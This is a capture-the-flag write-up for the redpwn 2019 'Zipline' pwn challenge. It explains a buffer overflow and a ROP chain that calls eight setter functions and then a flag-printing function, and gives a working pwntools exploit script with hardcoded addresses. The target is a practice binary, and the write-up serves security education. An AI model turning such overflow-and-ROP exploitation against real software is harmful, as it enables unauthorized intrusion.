# Zipline

## Pwn - Points: 50

> Written by: blevy
>
> 
>
> `nc chall2.2019.redpwn.net 4005`
>
> [zipline](zipline)
>

The binary prints the flag when it passes a check of 8 variables set to `true`. There are also 8 functions, where each of them sets one of these variables to `true`, but they are never called. You have to overflow the buffer in the `zipline` function and build a ROP-chain to call all of the functions once and then return to the `RBP` to call the `i_got_u` function that contains the check and prints the flag.

Exploit script:

```python
from pwn import *


air = 0x8049216
water = 0x804926d
land = 0x80492c4
underground = 0x804931b
limbo = 0x8049372
hell = 0x80493c9
minecraft_nether = 0x8049420
bedrock = 0x8049477
i_got_u = 0x8049569

p = process('./zipline')

p.sendlineafter('\n', 'A' * 22 + p32(air) + p32(water) + p32(land) + p32(underground) + p32(limbo) + p32(hell) + p32(minecraft_nether) + p32(bedrock) + p32(i_got_u))
print p.recvall()
```